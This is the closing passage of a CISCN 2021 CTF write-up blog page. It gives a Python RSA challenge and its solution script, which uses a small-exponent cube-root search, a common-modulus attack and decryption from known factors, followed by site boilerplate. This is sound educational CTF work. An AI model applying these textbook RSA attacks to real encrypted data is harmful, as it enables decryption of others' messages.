class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>xx = <span class="hljs-number">0</span><br>yy = <span class="hljs-number">2</span><br><br>text = []<br><br>m1 = bytes_to_long(text[:xx])<br>m2 = bytes_to_long(text[xx:yy])<br>m3 = bytes_to_long(text[yy:])<br><br>e1 = <span class="hljs-number">3</span><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>N1 = p1*q1<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m1,e1,N1)<br><span class="hljs-built_in">print</span> (e1,N1)<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>e2 = <span class="hljs-number">17</span><br>e3 = <span class="hljs-number">65537</span><br>q2 = getPrime(<span class="hljs-number">512</span>)<br>N2 = p2*q2<br><br><span class="hljs-built_in">print</span> (e2,N2)<br><span class="hljs-built_in">print</span> (e3,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m2,e2,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m2,e3,N2)<br><br>p3 = getPrime(<span class="hljs-number">512</span>)<br>q3 = getPrime(<span class="hljs-number">512</span>)<br>N3 = p3*q3<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(m3,e3,N3)<br><span class="hljs-built_in">print</span> p3&gt;&gt;<span class="hljs-number">200</span><br><span class="hljs-built_in">print</span> (e3,N3)<br><br>n = <span class="hljs-number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span><br>e1 = <span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br><br>m1 = <span class="hljs-string">&quot;&quot;</span><br>m2 = <span class="hljs-string">&quot;&quot;</span><br>m3 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">130000000</span>):<br>    a, b = gmpy2.iroot(e1 + j * n, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span>:<br>        m = a<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x is &#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(long_to_bytes(m)))<br>        m1 = long_to_bytes(m)<br>        <span class="hljs-keyword">break</span><br><br>n2 = <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span><br><br>e1 = <span class="hljs-number">17</span><br>e2 = <span class="hljs-number">65537</span><br><br>s = gcdext(e1, e2)<br><br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c2 = <span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>c1 = <span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><br>c2 = invert(c2, n2)<br>m = (<span class="hljs-built_in">pow</span>(c1,s1,n2) * <span class="hljs-built_in">pow</span>(c2 , s2 , n2)) % n2<br>m2 = long_to_bytes(m)<br><br>p3 = <span class="hljs-number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span><br>q3 = <span class="hljs-number">9918033198963879798362329507637256706010562962487329742400933192721549307087332482107381554368538995776396557446746866861247191248938339640876368268930589</span><br>enc3 = <span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>e3 = <span class="hljs-number">65537</span><br>n3 = <span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span><br><br><br>ph3 = (p3-<span class="hljs-number">1</span>)*(q3-<span class="hljs-number">1</span>)<br>d3 = gmpy2.invert(e3,ph3)<br>m3 = <span class="hljs-built_in">pow</span>(enc3,d3,n3)<br>m3 = long_to_bytes(m3)<br>message = m1 + m2 + m3<br><br>md5 = hashlib.md5()<br>md5.update(message)<br><span class="hljs-built_in">print</span> md5.hexdigest()<br><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/CISCN/">#CISCN</a>
+      
+        <a href="/tags/WP/">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp</div>
+      <div>https://www.0error.net/2021/05/6c0728af.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jason</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年5月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/78b59d9f.html" title="Python的For/Else语句">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python的For/Else语句</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/832f70bb.html" title="【刷题记录】AcWing 435. 传球游戏">
+                        <span class="hidden-mobile">【刷题记录】AcWing 435. 传球游戏</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'cjjcn/cjjcn.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'Comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-copyright"></i> <a href="https://www.0error.net" target="_blank" rel="nofollow noopener"><span>2017 - 2024</span></a><br> <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">本网站由<img border="0" height="20" src="https://image.0error.net/img/2022/又拍云_logo2.png" srcset="/img/loading.gif" lazyload />提供CDN加速/云存储服务</a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      陇ICP备2021000723号-1
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
